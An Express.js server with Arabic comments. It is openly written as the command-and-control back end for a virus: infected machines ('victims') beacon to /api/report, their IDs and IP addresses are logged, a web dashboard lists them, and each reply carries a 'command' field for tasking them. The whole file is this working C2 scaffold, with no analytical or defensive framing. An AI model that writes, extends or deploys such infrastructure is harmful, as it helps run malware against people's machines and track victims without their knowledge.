const express = require('express');
const app = express();
app.use(express.json());

// قائمة مؤقتة لتخزين الأجهزة المتصلة
let victims = [];

// 1. الصفحة الرئيسية أو الدشبورد (اللي هتدخل تشوفها من المتصفح)
app.get('/', (req, res) => {
    let html = `<h2>Web Control Dashboard</h2><table border="1"><tr><th>ID</th><th>IP</th><th>Last Seen</th></tr>`;
    victims.forEach(v => {
        html += `<tr><td>${v.id}</td><td>${v.ip}</td><td>${v.time}</td></tr>`;
    });
    html += `</table>`;
    res.send(html);
});

// 2. نقطة استقبال البيانات (الـ Endpoint اللي الفيروس هيراسله)
app.post('/api/report', (req, res) => {
    const { id } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // تسجيل أو تحديث الجهاز
    let existing = victims.find(v => v.id === id);
    if (existing) {
        existing.time = new Date();
    } else {
        victims.push({ id, ip, time: new Date() });
    }

    res.json({ status: "success", command: "none" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
